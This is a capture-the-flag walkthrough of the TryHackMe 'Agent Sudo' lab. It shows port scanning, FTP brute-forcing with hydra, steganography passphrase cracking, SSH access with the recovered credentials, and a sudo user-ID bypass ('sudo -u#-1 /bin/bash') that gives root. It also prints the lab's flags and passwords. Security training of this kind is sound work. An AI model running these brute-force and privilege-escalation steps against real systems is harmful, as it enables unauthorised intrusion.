## Enumerate

### How many open ports?

The answer is 3.

```
nmap -p- -T4 -sV --min-rate 5000 -o agent_sudo 10.10.237.117
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-25 18:08 -03
Warning: 10.10.237.117 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.237.117
Host is up (0.27s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.79 seconds
```

### How you redirect yourself to a secret page?

Changing the User-agent to `C` will make it work.

And will get redirected to the page `http://10.10.237.117/agent_C_attention.php` with the following message:

```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```

### What is the agent name?

The answer is `agent_C` and his name is `Chris`.

## Hash cracking and brute-force

### FTP password

```bash
nmap --script ftp-brute -p 21 10.10.237.117
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-25 19:17 -03
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for 10.10.237.117
Host is up (0.23s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute:
|   Accounts: No valid accounts found
|_  Statistics: Performed 2963 guesses in 602 seconds, average tps: 4.8

Nmap done: 1 IP address (1 host up) scanned in 602.87 seconds
```

```bash
hydra -l chris -P /usr/share/seclists/Passwords/500-worst-passwords.txt -t 32 10.10.237.117 ftp
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-25 19:40:58
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 32 tasks per 1 server, overall 32 tasks, 499 login tries (l:1/p:499), ~16 tries per task
[DATA] attacking ftp://10.10.237.117:21/
[21][ftp] host: 10.10.237.117   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-25 19:41:48
```

### Zip file password

???

### steg password

The password is `Area51`

```bash
stegseek --crack cute-alien.jpg /workspace/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".
```

### Who is the other agent (in full name)?

The name is `james`.

```bash
cat cute-alien.jpg.out
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

### SSH password

The password is `hackerrules!`.

## Capture the user flag

### User flag

The user flag is in the home of the user `James`.

```bash
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
james@agent-sudo:~$
```

### What is the incident of the photo called?

`roswell alien autospy`

https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment

## Privileage escalation

### CVE number for the escalation

https://www.exploit-db.com/exploits/47502

### Root flag

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~#
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

### (Bonus) Who is Agent R?

The agent R is `DesKel`